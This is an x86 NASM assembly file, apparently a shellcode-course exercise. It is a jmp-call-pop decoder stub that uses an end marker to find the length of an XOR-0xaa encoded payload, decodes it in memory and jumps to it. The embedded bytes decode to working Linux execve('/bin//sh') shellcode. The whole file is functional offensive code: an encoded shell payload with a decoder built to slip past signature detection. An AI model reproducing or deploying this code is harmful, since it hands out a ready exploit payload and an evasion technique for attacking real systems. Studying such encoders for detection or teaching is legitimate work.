; filename: xor-decoder-marker.nasm
; author: lawly
; description: stub that decodes the xor-encoded shellcode by obtaining its length with a marker and passes execution to it
; 

global _start

section .text
_start:

    jmp short call_decoder

decoder:
    pop esi                     ; get address of shellcode
    mov ebx, esi

    xor eax, eax
    xor ecx, ecx
    jmp short get_length

increment:
    inc ebx
    inc ecx
get_length:
    mov byte al, [ebx]
    xor al, 0xaa                ; end of shellcode reached?
    jnz short increment
    
decode:
    xor byte [esi], 0xaa        ; use ld -N! 
    inc esi
    loop decode

    jmp short shellcode

call_decoder:
    call decoder
    ; marker -> 0xaa at the end
    shellcode:  db  0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa